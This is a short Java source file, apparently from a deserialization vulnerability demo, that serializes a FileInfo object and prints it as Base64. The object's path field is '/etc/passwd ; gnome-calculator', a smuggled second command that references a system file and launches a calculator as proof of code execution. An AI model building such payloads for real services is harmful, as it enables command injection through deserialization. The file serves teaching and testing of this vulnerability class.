package tech.woodandsafety.unserialjavademo.vulnbin;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;

public final class StringSerialize {

    public void main(String[] args) throws IOException {
        try (ByteArrayOutputStream bos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(bos)) {

            System.out.println("FileInfo: ");
            Object o = new FileInfo("/etc/passwd ; gnome-calculator");
            System.out.println(o);
            oos.writeObject(o);

            System.out.println(new String(Base64.getEncoder().encode(bos.toByteArray())));
        }
    }

}
